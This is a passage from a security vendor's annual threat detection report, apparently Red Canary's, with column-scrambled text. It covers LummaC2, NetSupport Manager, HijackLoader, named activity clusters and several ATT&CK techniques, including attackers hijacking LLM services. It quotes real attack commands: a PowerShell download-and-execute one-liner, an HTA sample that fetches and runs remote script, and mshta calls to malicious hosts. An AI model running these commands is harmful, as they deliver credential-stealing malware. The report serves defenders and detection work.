and a loader capability for delivering additional
overhead, giving them access to effective malware
payloads via EXE, DLL, or PowerShell.
like LummaC2 with continuous development,
customer support, and a range of features.
A closer look
Because it’s distributed as a MaaS offering,
LummaC2 is used against many targets As it has grown in popularity over the past year,
opportunistically, with no particular industry LummaC2 has posed a major threat against
or geography being an exclusive recipient. organizations large and small, as the stealer
exposes credentials for user identities, allowing
Similar to other stealers, LummaC2 was initially adversaries to gain initial access to organizations
designed to target cryptocurrency wallets, browser using valid accounts.
LUMMAC2 DETECTIONS IN 2024

2025 THREAT DETECTION REPORT 45
Initial access indicators of compromise (IOC) The downloaded content at was about
Grpc.eml
vary according to the delivery method and loader 18 MB in size, which can indicate a large amount
chosen by the adversary, so early detection of embedded content, such as one or more
telemetry differs from case to case. LummaC2 embedded executable files. This type of LummaC2
delivery vehicles have been presented to users in configuration appears to be using as the
Grpc.eml
an array of creative ways, including: process injection source, targeting
powershell.
with no command-line interface (CLI) to
exe
• phishing emails leverage its memory space for the next phases of
• drive-by downloads posing as LummaC2 execution.
browser updates
• fake CAPTCHAs The above LummaC2 execution is very different
• masquerading as fake AI software from one we observed in November 2024 and
previously shared, illustrating the variety of
Popular LummaC2 loaders include: observable behaviors and artifacts that can be
seen in different LummaC2 configurations.
• ArechClient2/SectopRAT
• Emmenhtal
• SmartLoader The crypter connection
• HijackLoader/IDAT Loader
Behavioral detection of LummaC2 can vary
Adversaries have also used LummaC2 quite a bit since it requires distributors to use
to deliver PrivateLoader, Amadey, and crypters. Multiple detection analytics could
NetSupport Manager. catch LummaC2 simply because an adversary
configured the crypter in a particular way.
Crypters that we’ve observed paired with
Paste and run in action LummaC2 include PureCrypter and CypherIT.
We described LummaC2’s paste-and-run tactic Depending on the delivery method and adversary
in our November 2024 Intelligence Insights. configurations, LummaC2 may be injected into a
hollowed process—we’ve observed
OpenWith.exe
and , among others—or leverage DLL
more.com
side-loading for execution. The stealer activity
Watch our video on
LummaC2’s paste-and-run tactic. occurs within memory with direct exfiltration to
C2, however in some cases collected data may
be staged in text files like prior to ZIP
System.txt
archiving for theft. This means that looking for
In December 2024 we saw a LummaC2 threat
C2 activity or suspicious TXT file creation may
that began with the victim interacting with a fake
also help detect LummaC2. It does not maintain
CAPTCHA-style paste-and-run lure hosted at
persistence on its own, however accompanying
. Successful paste-and-run
solve.gevaq[.]com loaders or follow-on payloads may create and
execution resulted in reaching out to
mshta.exe maintain persistence.
to retrieve an
deduhko2.klipzyroloo[.]shop
encoded PowerShell script. That script in turn
pulled down and executed additional remote
Evolving tradecraft
resources from
deduhko[.]klipzyroloo[.]shop
with the command:
LummaC2 relies on HTTPS for exfiltration
of data to adversary systems. In late 2023
to early 2024, the developers of the stealer
“powershell.exe” -NoProfile
migrated its exfiltration capabilities to use
-ExecutionPolicy Bypass -Command
HTTPS over plaintext HTTP in an effort to to
& {IEX ((New-Object Net.WebClient).
evade network-based detection controls. Along
DownloadString(‘hxxps[://]deduhko.
with using HTTPS for encrypted communications,
klipzyroloo[.]shop/Grpc.eml’))}
LummaC2 developers also leverage Cloudflare

2025 THREAT DETECTION REPORT 46
services to make their exfiltration systems resilient the LummaC2 developers included functionality
and highly available. to send information in piecemeal rather than
doing the “collect, stage, send” technique. In
As the stealer became more mature in 2024, addition, when Google implemented application
LummaC2 incorporated more features to remain bound encryption (ABE) in Chromium browsers,
on the bleeding edge of the stealer market. To LummaC2 was rapid to adopt new techniques to
ensure data exfiltration even when interrupted, obtain browser cookies and bypass ABE.
Take action
Visit the LummaC2 threat page for detection Response
opportunities and relevant atomic tests to validate
your coverage. For response, an excellent playbook would look
something like this:
Prevention
• Delete all components delivering LummaC2
from disk, removing persistence
Since LummaC2 has been distributed in so many
• Determine what account details are stored in
different ways, preventative measures can take
the software on an affected system, including:
many approaches. We’ve also observed LummaC2
distributed in malicious advertisements, fake browsers
software installations, paste-and-run campaigns, file transfer software like FileZilla
and more. We’ve observed it delivered in script and WinSCP
form, via DLL sideloads. Telegram messaging
Steam gaming
General preventative measures that apply to cryptocurrency wallets
multiple malware families also help fight against VPN profiles
LummaC2: cloud credentials in CLI tool configuration
sensitive files stored in the user’s Desktop
• Provide safe software installation sources and Documents folders
for users
• Configure ad-blocking tools where possible • Once you determine the scope of data theft,
• Deploy endpoint security controls for take steps to reset any credentials stored
detection and protection on the system. This may also involve manually
revoking sessions to prevent cookie reuse.
• Finally, if financial details such as payment
cards or cryptocurrency wallets are stored
on the affected system, users may need to
monitor the relevant accounts for
unauthorized transactions.

2025 THREAT DETECTION REPORT 47
FEATURED THREAT
#7 OVERALL
NetSupport RANK
Manager 2.7% CUSTOMERS
AFFECTED
Popular among admins and adversaries alike,
NetSupport Manager has been increasingly
abused over the last few years.
Analysis
version of NetSupport Manager is easily
obtainable online.
A legitimate remote access tool that has
been in use for over 30 years, NetSupport While we’ve observed malicious use of NetSupport
Manager is one of the many remote monitoring Manager since at least 2020, malicious use
and management (RMM) tools misused by significantly increased over the course of 2022, a
adversaries. NetSupport Manager is so trend that continued across 2023 and into 2024.
commonly misused that it’s frequently referred NetSupport Manager first appeared in our monthly
to by security researchers as a malicious remote top 10 in February 2023. After almost making
access trojan (RAT) instead of a benign remote the cut in 2023, NetSupport Manager made it
access tool. There are multiple reasons for this, into the rankings as our seventh most prevalent
the most significant being that a free trial threat in 2024.
NETSUPPORT MANAGER DETECTIONS FROM 2022-2024

2025 THREAT DETECTION REPORT 48
Related threats Breaking down the parts
We’ve seen NetSupport Manager leveraged as NetSupport Manager has several components:
both a primary payload in its own right, as well
as a follow-on payload delivered by other threats 1. NetSupport Manager Client is the
in our top 10. Both Scarlet Goldfinch—which component that is installed on systems the
landed in 3rd—and LummaC2—coming in 6th— adversary wants to control. When we refer
used NetSupport Manager as a primary or to NetSupport Manager, this is typically the
follow-on payload. component we are referring to.
2. NetSupport Manager Control is the
Earlier in 2024 we saw FIN7 delivering NetSupport component used on the controlling
Manager in MSIX campaigns. Another reason for workstation. This component allows
NetSupport’s placing so high this year was its use adversaries to upload and execute files.
as a payload in paste-and-run campaigns. In 3. NetSupport Manager Deploy is a component
previous years we’ve seen it delivered alongside on the controlling workstation that creates
other threats as well, like FakeSG, SocGholish, some software packaging for deployment,
and Qbot. though it does not play an active role after the
client is installed.
Since adversaries have delivered NetSupport
Manager as a part of many campaigns, initial Legitimate NetSupport installs are often found in
delivery methods vary widely. Malicious the directory, using the standard
Program Files
NetSupport Manager can be the result of filename . Suspect instances may
client32.exe
phishing campaigns, fake updates, fake be found by looking for running
client32.exe
CAPTCHA lures, and more. from a non-standard directory, such as a user’s
or folder.
Downloads Roaming
It’s not unusual for adversaries to rename the
NetSupport Manager Client file, so looking for
binaries with the internal name making
client32
network connections to
netsupportsoftware[.]
is another good indicator of suspicious
com
NetSupport Manager use.
Take action
Visit the NetSupport Manager threat page for The best generic advice for mitigating the risk
detection opportunities and relevant atomic tests posed by NetSupport Manager is to create robust
to validate your coverage. allow/blocklist policies and strictly adhere to them.
Having the ability to collect and inspect NetSupport Manager execution is often achieved
binary signature metadata and binary naming using PowerShell. The most effective protection
conventions and understanding common and against PowerShell tradecraft is through the
uncommon installation paths for RMM tools like implementation and enforcement of a strong
NetSupport Manager are the basic prerequisites Windows Defender Application Control (WDAC)
for developing an effective detection strategy. Of policy, which places PowerShell into Constrained
course, the sheer volume of RMM tools available Language mode, mitigating a wide array of
to adversaries, let alone abused by them, renders PowerShell tradecraft.
confident detection coverage a tall order.

2025 THREAT DETECTION REPORT 49
FEATURED THREAT
#10 OVERALL
HijackLoader RANK
1.8% CUSTOMERS
Adopted by multiple adversaries, HijackLoader
AFFECTED
soared in 2024 as the loader of choice for the
increasingly popular LummaC2 payload.
Analysis It’s all in the name
The names “HijackLoader” and “IDATLoader” are
HijackLoader, also known as “IDAT Loader,”
both nods to notable behaviors in early
“GHOSTPULSE,” or “SHADOWLADDER,” is a
observations of the malware. Typically adversaries
malware loader that delivers additional payloads
deliver HijackLoader as a ZIP archive containing
through process injection. In use since at least
a legitimate executable alongside a malicious
July 2023, multiple adversary groups leverage
DLL sideloaded as a DLL hijack (the “hijack” in
HijackLoader to deliver a wide array of payloads,
“HijackLoader”), among other files. The malicious
including stealers and remote access trojans
payload is steganographically hidden in a separate
(RAT). The rise of paste-and-run campaigns in
image file and identified by the string of letters
2024 propelled HijackLoader up the ranks as a
IDAT within the binary contents of the image.
popular means of executing LummaC2 and other
payloads. First observed together in June 2024,
campaigns leveraging HijackLoader to deliver HijackLoader’s execution flow begins with
the hijacked legitimate EXE, passing through
LummaC2 spiked in November, leading to its debut
the sideloaded DLL, which reads in the image
in our December 2024 Intelligence Insights.
file containing the encrypted HijackLoader
configuration details. The payload specified by
the config is executed by spawning a legitimate
Watch our video on HijackLoader. child process in a suspended state and injecting
the payload into the memory space of the child
process. In many cases this injected child process
serves as a shellcode loader for the final payload,
which often manifests in the form of yet another
injected child process.
HIJACKLOADER ATTACK CHAIN

2025 THREAT DETECTION REPORT 50
DLL dispatch doesn’t use a hijack at all. Rather than packaging
a ZIP with a legitimate EXE, malicious DLL, and
Throughout 2024, the ZIP files observed contained accompanying image file, this new campaign
a wide array of hijackable DLLs, and in some bundles all three components into a single signed
cases the operator renamed the legitimate EXE. EXE file. Instead of leveraging the sideloaded DLL
For example, we commonly observed to extract the config from a separate image file,
setup.
being used in place of the legitimate EXE’s the image is included as a resource within the
exe
filename. Similarly, we observed variations in the signed EXE. The extraction process works similarly,
child processes used to host the injected final and execution proceeds via process injection as
payload. The initial injected process acting upon described above.
the HijackLoader configuration tended to be one
of , , or , while the Researchers at ZScaler have continually updated
choice.exe cmd.exe more.com
final injected process containing the next-stage a blog detailing the technical analysis of
payload had more variability, including renamed HijackLoader, including information on defense
instances of as well as legitimate evasion and anti-analysis techniques.
autoit3.exe
Windows binaries such as:
Keep your eye on the payload
•
cmd.exe
•
explorer.exe
Regardless of how it’s delivered or what
•
msbuild.exe
it’s injecting into, the primary concern with
•
msiexec.exe
HijackLoader is the payload it delivers. Throughout
•
rundll32.exe
2024, the majority of the HijackLoader we
•
searchindexer.exe
observed delivered stealers—predominantly
•
vbc.exe
LummaC2, but alternatives such as ArechClient2,
CryptBot, Redline, and others were also common.
For example, we’ve seen HijackLoader inject into
In 2023 we observed later-stage activity from a
, which has led to the download and
more.com
Scarlet Goldfinch infection leveraging NetSupport
execution of a renamed AutoIT3 binary, which in
to deliver Havoc via HijackLoader. Throughout late
turn performed credential access and maintained
2023 and early 2024, we observed adversaries
sustained network connectivity to a C2 server
delivering MSIX installers using HijackLoader to
consistent with LummaC2 execution.
deploy FakeBat.
Hit the road, hijack Other researchers have reported HijackLoader
leading to Carbanak, Danabot, and IcedID, tools
While the DLL sideloads that lend their hijacks to more closely linked to established criminal groups
the HijackLoader name continue to be an effective that are sometimes affiliated with ransomware.
delivery method, reports in October 2024
detailed a new variant of HijackLoader that
Take action
Visit the HijackLoader threat page for
detection opportunities and relevant atomic tests.
HijackLoader has established itself as a major
player across the threat landscape, employed
by a diverse set of adversaries. As such, quick
detection and response is a must.

2025 THREAT DETECTION REPORT 51
Field Guide to
Color Bird Threats
A definitive guide to “color birds,” what we call
fledgling activity clusters we’ve named after
tracking patterns of malicious behavior.
You may have noticed some unusual names in Red Canary’s reporting; when our Intelligence team
encounters a cluster of activity that does not match any known threats we are tracking, we use a naming
convention inspired by Red Canary’s own name: color + bird. We choose the various colors and bird
species with help from our resident birdwatchers, who make connections based on ornithological
behavior similarities. We’re partial to alliteration.
In this new and handy field guide, we’ve rounded up the most interesting activity clusters we’ve named
and tracked over the last few years, including some endangered species we haven’t seen in a while.
Visit the web version of the report for detection opportunities related to these activity clusters.
First observed: Date we started Release date: Date we released Last observed: Date of the last time the
KEY
tracking the activity cluster the threat profile to customers threat was seen (as of December 31, 2024)
Field notes
Tangerine Turkey Tangerine Turkey is an activity cluster characterized
by a Visual Basic Script (VBScript) worm delivering
a cryptomining payload, typically via infected
USB. The VBScript file name typically begins with
the letter followed by six digits, for example
x
. A CMD child process from
x644291.vbs wscript.
then executes a BAT file with a similar naming
exe
convention and creates a folder named
C:\Windows
(note the space after ).
\System32 Windows
The worm then makes a copy of the legitimate
from to the
printui.exe C:\Windows\System32
newly created folder, as
C:\Windows \System32
well as a malicious DLL named as a
printui.dll
sideloaded DLL hijack.
First observed: November 2024
Release date: December 2024 Sightings
Last observed: December 2024 Intelligence Insights: January 2025
Tangerine Turkey mines cryptocurrency in
global campaign
Tangerine Turkey: The USB worm that mines crypto

2025 THREAT DETECTION REPORT 52
TOP 10 THREAT
Field notes
Amber Albatross
Amber Albatross is an activity cluster characterized
by certain potentially unwanted programs
(PUP) delivering a setup file and stealer payload.
A complex installation chain with obfuscation
and anti-analysis techniques eventually leads to
unpacking a Pyarmor-obfuscated PyInstaller that
is launched via and ,
cmd.exe powershell.exe
before initiating a sequence of reconnaissance
commands similar to those used by many stealers.
Sightings
Intelligence Insights: July 2024
Intelligence Insights: August 2024
Intelligence Insights: October 2024
First observed: January 2024
Release date: March 2024 Intelligence Insights: November 2024
Last observed: December 2024 Intelligence Insights: December 2024
Field notes
Saffron Starling Saffron Starling is an activity cluster that
downloads and delivers malicious payloads
following a phishing attempt. Specifically, the
loader is delivered via ZIP archives containing
JScript or VBScript. When executed, the scripts
create a renamed copy of and download
cURL
the subsequent payload, which include Danabot,
DarkGate, or Matanbuchus malware. In some
cases, a PDF file is downloaded and presented
to the user in order to distract from payload
deployment.
Sightings
Drop It Like It’s Qbot (BSidesRemix):
First observed: September 2022
Detecting initial execution earlier with OSINT
Release date: July 2024
Last observed: August 2024

2025 THREAT DETECTION REPORT 53
TOP 10 THREAT
Other names
Scarlet Goldfinch HANEYMANEY | SmartApeSG | ZPHP
Field notes
Scarlet Goldfinch is an activity cluster that lures
unsuspecting victims to download a malicious
browser update, similar to SocGholish and
other fake update threats. To get access to
systems, Scarlet Goldfinch redirects users from
compromised sites that contain injected JScript
code to a site that prompts victims to download a
fake update to their internet browser. The download
contains the first-stage JScript that is executed
via . Upon execution, the JScript
wscript.exe
downloads an additional payload, which has
First observed: June 2023
consistently been NetSupport Manager.
Release date: August 2023
Last observed: December 2024
Sightings
Scarlet Goldfinch: Taking flight with
NetSupport Manager
Field notes
Lilac Lyrebird Lilac Lyrebird is an activity cluster associated with
search engine optimization (SEO) poisoning and
malvertising. It leads to a technical support scam
that tricks users into giving the operator access
to their machine via LogMeIn. Once the adversary
gains access, they use PowerShell to download
a malicious batch file that is executed via the
creation of a scheduled task.
Sightings
Intelligence Insights: May 2023
First observed: March 2023
Release date: April 2023
Last observed: December 2024

2025 THREAT DETECTION REPORT 54
Field notes
Charcoal Stork
Charcoal Stork is an activity cluster involving
a suspected pay-per-install content provider
that relies on malvertising to deliver installers.
These installers masquerade as anything from
cracked games to wallpaper, and their goal is
to install malicious payloads. Early Charcoal
Stork campaigns delivered ChromeLoader and
SmashJacker, where sightings in 2023 delivered
more concerning malware such as VileRAT,
a Python remote access trojan (RAT) that is
reportedly uniquely used by a cyber mercenary
group called DeathStalker. Files associated
with Charcoal Stork have a default filename
of or
install.exe Your File Is Ready to
. We primarily distinguish Charcoal
First observed: May 2022 Download
Stork activity from follow-on activity through
Release date: August 2023
installer file names and hashes.
Last observed: December 2024
Sightings
Intelligence Insights: September 2023
The rise of Charcoal Stork
Charcoal Stork - Red Canary Threat
Detection Report
Other names
Raspberry Robin QNAP Worm
Field notes
Raspberry Robin is an activity cluster involving a
worm, possibly installed via USB drive, that may be
related to ransomware. This activity cluster uses
to call out to infrastructure, typically
msiexec.exe
compromised QNAP devices, using HTTP requests
that contain user and device names of the victim.
This has led to the downloading and execution of
malicious DLL files.
Sightings
First observed: September 2021
Raspberry Robin gets the worm early
Release date: February 2022
Raspberry Robin - Red Canary Threat
Last observed: December 2024
Detection Report
Emulating Raspberry Robin using Atomic Red Team

2025 THREAT DETECTION REPORT 55
Field notes
Mango Parakeet
Mango Parakeet is an activity cluster characterized
by subtle masquerading techniques, such as
naming malicious binaries to mimic
svcnost.exe
, renaming to execute
svchost.exe wscript.exe
malicious JS files, using rudimentary homograph
spoofing such as replacing a lower-case with
l
a capital , and extending spacing between the
I
malicious executable’s name and extension. Mango
Parakeet is often observed spreading malicious
worms via USB flash drives. During execution,
Mango Parakeet uses to launch batch
cmd.exe
scripts to create malicious executables, JavaScript,
and DLL files on a target system. It then launches
the malicious JavaScript file using a renamed
instance of .
First observed: April 2020 wscript.exe
Release date: July 2021
Last observed: August 2024
Other names
Yellow Cockatoo Jupyter Infostealer | Polazert | Solarmarker
Field notes
Yellow Cockatoo is an activity cluster that is
characterized by search engine redirects eventually
leading to the in-memory execution of a .NET
remote access trojan (RAT). Yellow Cockatoo’s
malware has the capability to drop additional
payloads and use encoded PowerShell to steal
browser information. Interestingly, this bird is known
to “fly south for the winter,” in that it takes breaks
after researchers publish information about its
operations, resuming activity months later after
retooling.
First observed: October 2020
Release date: December 2020
Last observed: November 2024 S ightings
Yellow Cockatoo: Search engine redirects,
in-memory remote access trojan, and more
Yellow Cockatoo - Red Canary Threat
Detection Report

2025 THREAT DETECTION REPORT 56
Other names
Silver Toucan UpdateAgent
Field notes
Silver Toucan is an activity cluster that uses signed
macOS malware to deploy payloads such as
AdLoad, often for ad fraud and other monetization
activities. Silver Toucan discloses its own terms
of service stating that victim hosts may be used
for proxy activities. This cluster requires user
interaction with an Apple Disk Image File (DMG) or
macOS Installer File (PKG). Once executed, Silver
Toucan establishes persistence using macOS
LaunchAgents. The cluster uses the utility to
cURL
conduct command and control (C2) operations,
First observed: September 2020
log installation and update progress, and to
Release date: January 2021
receive commands to download and execute
bash
Last observed: December 2024
additional files. In some cases, Silver Toucan
delivers AdLoad malware as a payload.
Sightings
How to thwart application bundle manipulation
on macOS
ENDANGERED SPECIES
Field notes
Coral Crane Coral Crane is an activity cluster that uses ISO
images containing malicious VBScript code
followed by obfuscated PowerShell commands
to filelessly download and execute payloads
such as AsyncRAT. The activity cluster uses
simple obfuscation through string replacement in
PowerShell commands to deobfuscate code prior
to execution.
Sightings
Intelligence Insights: February 2022
First observed: November 2021
Release date: February 2022
Last observed: March 2023

2025 THREAT DETECTION REPORT 57
ENDANGERED SPECIES
Field notes
Silver Sparrow Silver Sparrow is an activity cluster with
infrastructure designed to deliver malware to
macOS systems. It leverages AWS S3 buckets
to stage macOS PKG files with names like
update.
or . During execution, the
pkg updater.pkg
malware executes JavaScript to orchestrate the
creation of files and scripts for persistent execution,
attempting to download updated payloads from
additional S3 buckets every hour. There are
specialized variants of Silver Sparrow for the
x86_64 and the Apple M1 ARM64 architectures,
implying that the malware was intended
specifically for newer macOS systems.
First observed: January 2021 Sightings
Release date: February 2021
Silver Sparrow macOS malware with
Last observed: August 2023
M1 compatibility
Silver Sparrow - Red Canary Threat
Detection Report
ENDANGERED SPECIES
Field notes
Blue Mockingbird Blue Mockingbird is an activity cluster that deploys
a DLL version of XMRig on Windows systems.
Tracked publicly since August 2020, the threat
achieves initial access by exploiting public-facing
applications, eventually establishing persistence
by using the environment variable
COR _ PROFILER
to hijack execution flow, task scheduling, or service
installation. To execute, Blue Mockingbird either
registers the DLL with or executes
regsvr32.exe
using . Ultimately, the cluster tries
rundll32.exe
to use system resources to mine cryptocurrency,
specifically referring to Monero wallet addresses.
Sightings
First observed: February 2020
Introducing Blue Mockingbird
Release date: August 2020
Keeping tabs on the Blue Mockingbird
Last observed: June 2023
Monero miner
Blue Mockingbird activity mines Monero
cryptocurrency

2025 THREAT DETECTION REPORT 58
TOP TECHNIQUES
The purpose of this section is to help you detect techniques whenever possible, allowing us to
malicious activity in its early stages so you don’t associate the behaviors that comprise a confirmed
have to deal with the consequences of a serious threat detection with the industry standard for
security incident. classifying adversary activity.
The following chart represents the most When counting techniques, we filter out detections
prevalent MITRE ATT&CK® techniques associated with potentially unwanted programs
observed in confirmed threats across the Red and authorized testing in order to make this list as
Canary customer base in 2024. To briefly reflective of actual adversary behavior as possible.
summarize what’s explained in detail in the
Methodology section, we have a library of
thousands of detection analytics that we use
In addition to the top 10, read our analysis of
to surface potentially malicious and suspicious
the following featured technique:
activity across our customers’ environments.
T1218.005: Cloud Service Hijacking
These custom detectors and third-party alerts
are mapped to corresponding MITRE ATT&CK
TOP TECHNIQUES DETECTED IN 2024
1. Cloud Accounts 6. Service Execution
2. Windows Command Shell 7. Modify Registry
3. Email Forwarding Rule 8. Windows Management Instrumentation
4. PowerShell 9. Mshta
5. Email Hiding Rules 10. Ingress Tool Transfer

2025 THREAT DETECTION REPORT 59
TOP TECHNIQUES
What’s included in this section
This PDF spotlights three MITRE ATTACK
techniques, covering how and why adversaries
leverage them and relevant mitigation advice.
You can view the full analysis of all of the top
10 techniques—including visibility, collection,
detection, and testing guidance—in the web
version of this report.
How to use our analysis
Implementing the guidance in this report will help
security teams improve their defense in depth
against the adversary actions that often lead
to a serious incident. Readers will gain a better
understanding of common adversary actions
and what’s likely to occur if an adversary gains
access to your environment. You’ll learn what
malicious looks like in the form of telemetry
and the many places you can look to find that
telemetry. You’ll gain familiarity with the principles
of detection engineering by studying our detection
opportunities. At a bare minimum, you and your
team will be armed with hyper-relevant and
easy-to-use Atomic Red Team tests that you
can leverage to ensure that your existing security
tooling does what you think it’s supposed to do.
More strategically, this report can help you identify
gaps as you develop a road map for improving
coverage, and you can assess your existing
sources of collection against the ones listed in
this report to inform your investments in new
tools and personnel.

2025 THREAT DETECTION REPORT 60
FEATURED TECHNIQUE #5 OVERALL
RANK
Email Hiding Rules
9.0% CUSTOMERS
AFFECTED
Adversaries employ email hiding rules in order to cover
their tracks and avoid alerting victims to their activity.
610 THREATS
DETECTED
Analysis An adversary may set one or more of the following
inbox rule properties that would distinguish it
specifically as a potential hiding rule:
Why do adversaries abuse email
• The property is set to .
hiding rules? DeleteMessage True
Setting this option sends the target message
to the Deleted Items folder, resulting in the
When an adversary compromises an email inbox
victim being unlikely to see messages that an
and uses it to send or intercept emails, they often
adversary wants to hide as they are unlikely to
cover their tracks by moving, hiding, or otherwise
closely inspect the contents of their deleted
deleting suspicious email messages, thereby
email folder.
concealing them from their victim. Rather than
manually deleting sent emails, which runs the
• The property is set to . This
risk of neglecting to cover some of their tracks, MarkAsRead True
will mark the target message as read, which
an adversary may utilize the native automation
benefits an adversary by not incrementing the
offered by Outlook inbox rules to cover their
unread email count for messages they want
tracks in an attempt to not alert the victim of
hidden from the victim.
their actions.
• The property is set to any one
MoveToFolder
How do adversaries abuse email of the following built-in Exchange folders.
These folders are less likely to be inspected
hiding rules?
by the victim:
The difference between the Email Hiding
Archive
Rule ATT&CK technique and its sibling Email
Conversation History
Forwarding Rule lies in how they handle incoming (frequently abused by adversaries)
messages and their intended purposes. In short,
Deleted Items
an email hiding rule affects the visibility and
Junk Email
organization of emails in the same mailbox, while
RSS Feeds
an email forwarding rule sends emails to another (frequently abused by adversaries)
mailbox entirely.
RSS Subscriptions
(frequently abused by adversaries)
The mechanism by which an adversary uses
Outlook inbox rules to cover their tracks is identical
• When the message subject or email body
to the mechanism for creating a forwarding rule
contains words related to phishing or a
but the configuration will differ slightly.
security incident—e.g., “phishing,”
“hack,” “spam,” etc., adversaries most
often specify terms like these using the
property.
SubjectOrBodyContainsWords

2025 THREAT DETECTION REPORT 61
HOW ADVERSARIES ABUSE EMAIL RULES
1. Obtain credentials 2. Log in with 3. Perform reconnaissance
or session token compromised identity in email inbox
4. Create email rule to 5. Send email to internal finance 6. Collect $$$
automatically delete certain department requesting to
messages o r send them to modify payroll information
a junk folder or send a wire transfer
Take action
Visit the Email Hiding Rules technique page in the image below. Note that this only disables
to explore: rule creation via the web UI. It does not disable
rule creation via PowerShell cmdlets. Be sure to
• relevant MITRE ATT&CK data sources still audit inbox rule creation and apply additional
• log sources to expand your collection scrutiny to any rule created.
• detection opportunities you can tune to
your environment
• atomic tests to validate your coverage
An Exchange Online administrator can globally
disable inbox rule creation via the Outlook web UI
by running the following PowerShell cmdlet:
Set-OwaMailboxPolicy -Identity
OwaMailboxPolicy-Default
-RulesEnabled $False
Now, when a user attempts to create an inbox
rule, they will be prevented from doing so, as seen

2025 THREAT DETECTION REPORT 62
FEATURED TECHNIQUE #9 OVERALL
RANK
Mshta
4.9% CUSTOMERS
AFFECTED
After a four-year hiatus, Mshta is back in the
top 10, thanks in part to adversaries leveraging
a “paste and run” technique for initial access. 384 THREATS
DETECTED
Analysis Regardless of the method used, adversaries
generally only embed enough HTA script content
to spawn a subsequent, malicious child process;
Why do adversaries use Mshta? in most cases. Here is a sample,
powershell.exe
sanitized HTA payload based on the following
is a Windows-native binary designed VirusTotal sample:
mshta.exe
to execute Microsoft HTML Application (HTA)
script code. As its full name implies, Mshta can
execute Windows Script Host code (VBScript
and JScript) embedded within HTML in a network
proxy-aware fashion. These capabilities make
Mshta an appealing vehicle for adversaries to <html>
proxy execution of arbitrary script code through <head>
a trusted, signed utility, making it a reliable <title>Google Reload DNS</title>
technique during both initial and later stages <HTA:APPLICATION ID=”Google Repair” AP-
of an infection. PLICATIONNAME=”B” BORDER=”none” SHOWIN-
TASKBAR=”no” SINGLEINSTANCE=”yes”
WINDOWSTATE=”minimize”>
Mshta also grants adversaries the flexibility
</HTA:APPLICATION>
to embed a script payload within any legitimate file
<script language=”VBScript”>
format. For example, it is common for adversaries
Option Explicit:Dim a:Set a=CreateOb-
to embed HTA content within legitimate Microsoft
ject(“WScript.Shell”):Dim b:b=”power-
binaries (e.g., an embedded HTA payload
shell -NoProfile -ExecutionPolicy Bypass
contained within dialer.exe ). They simply -Command “”
append malicious HTA content to the end of the file {$U=[System.Text.Encoding]::UTF8.
and scans through the file until it finds GetString([System.Convert]::From-
mshta.exe
valid HTA script content. Adversaries know that Base64String(‘aHR0cHM6Ly9yYXcuZ2l0aH-
a payload is less likely to be initially caught if it is VidXNlcmNvbnRlbnRbLl1jb20vRGFzaW5pU-
embedded within an otherwise legitimate file. 3VtYW5hd2VlcmEvc2lsdmVyLWxhbXAvcmVm-
cy9oZWFkcy9tYWluL1JFREFDVEVELnR4dA==’))
$C=(Invoke-WebRequest -Uri $U -UseBa-
How do adversaries use Mshta? sicParsing).Content
$B=[scriptblock]::Create($C)
$B}”””:a.Run b,0,True:self.close
There are various methods in which HTA script
</script>
content can be executed but adversaries generally
</head>
prefer the following:
<body></body>
</html>
• inline via an argument passed in the command
line to Mshta
• file-based execution via an HTML Application
(HTA) file on disk

2025 THREAT DETECTION REPORT 63
Additionally, here is a sampling of command-line We’ve also observed adversaries leverage
invocation of commonly seen in to download and execute a malicious
mshta.exe mshta.exe
the wild: payload from a remote resource in the popular
“paste and run” technique described in detail in
• the Initial access section of this report.
“mshta.exe” hXXps://rebekkaworm[.]
snuggleam.org/time.json
•
“mshta.exe” hXXps://pwctrustlaw[.]com/ ASSOCIATED THREATS
Ray-verify.html
•
“C:\WINDOWS\system32\mshta.exe”
LummaC2
hXXps://clicktogo[.]click/downloads
/tra10
•
“mshta.exe” “C:\Users\redacteduser\
Cobalt Strike
Downloads\QcNezuts8lmKJKw.hta”
{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}
{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}
•
“mshta.EXE” NetSupport Manager
vbscript:Execute
(“CreateObject(“”WScript.
Shell””).Run “”powershell
Mimikatz
-ExecutionPolicy Bypass & ‘C:\Users\
redacteduser\Documents\redacted.
ps1’””, 0:close”)
• HijackLoader
mshta C:\ProgramData\
wBqERTofgffxGgvtPv.rtf
Take action Deploying an allow-all policy is as easy as
running the following code from an elevated
PowerShell prompt:
Visit the Mshta technique page to explore:
ConvertFrom-CIPolicy -XmlFilePath
• relevant MITRE ATT&CK data sources C:\Windows\schemas\CodeIntegrity\
• log sources to expand your collection ExamplePolicies\AllowAll.xml
• detection opportunities you can tune to -BinaryFilePath C:\Windows\System32\
your environment CodeIntegrity\SIPolicy.p7b
• atomic tests to validate your coverage CiTool.exe -up C:\Windows\System32\
CodeIntegrity\SIPolicy.p7b
Prevent the execution of HTA
When WDAC blocks the execution of HTA
script content content, unfortunately, there are no logs to
indicate a successful block, so be mindful of this
When a Windows Defender Application Control when observing command-line evidence of HTA
(WDAC) policy is deployed, regardless of the content. Rest assured, however, that execution
configuration and enforcement mode, all HTA will be prevented.
execution will be blocked. So even an allow-all
policy in audit mode will block HTA execution Take note that upon deploying an allow-all policy,
without blocking execution of any a side effect is that PowerShell will be placed
other executables or scripts. into constrained language mode, which may not
be desired without further validation. If the risk is
acceptable however, constrained language mode
by its very nature will block a significant amount of
PowerShell-based attacks.

2025 THREAT DETECTION REPORT 64
FEATURED TECHNIQUE
Cloud Service Hijacking
After compromising a cloud environment, adversaries can
potentially hijack large language models (LLM) to siphon
computing power, distribute illicit content, and more.
Analysis run API commands like ListFoundationModels
in AWS or query the OpenAI azure endpoint for
available models.
Why do adversaries
hijack cloud services? Once the adversary has identified which
models are available, they can request access or
leverage existing ones if they’re enabled. In AWS
Adversaries may compromise software-as-a-
service (SaaS) applications to perform various this can take the form of the InvokeModel or
malicious activities at scale against victims. This InvokeModelWithResponseStream commands.
This allows a user to prompt the model and return
may take the form of mass spam campaigns or
a response.
large-scale phishing operations by leveraging
services such as AWS Simple Notification Service
Regardless of the targeted service, adversaries
(SNS) or Twilio to send text messages or emails.
typically follow the same behavioral patterns
of compromise:
With the rise of large language model (LLM) usage,
services such as AWS Bedrock, Azure OpenAI,
and GCP Vertex AI have become prime targets for
HOW ADVERSARIES HIJACK LLM
adversaries, in an attack known as “LLMJacking.”
AND OTHER SERVICES IN THE CLOUD
Adversaries have reportedly sold access to
these hijacked models as part of their own SaaS
“business.” They will also deliver content (often
illicit) to end users through services such as
OAI reverse proxy, using multiple accounts to
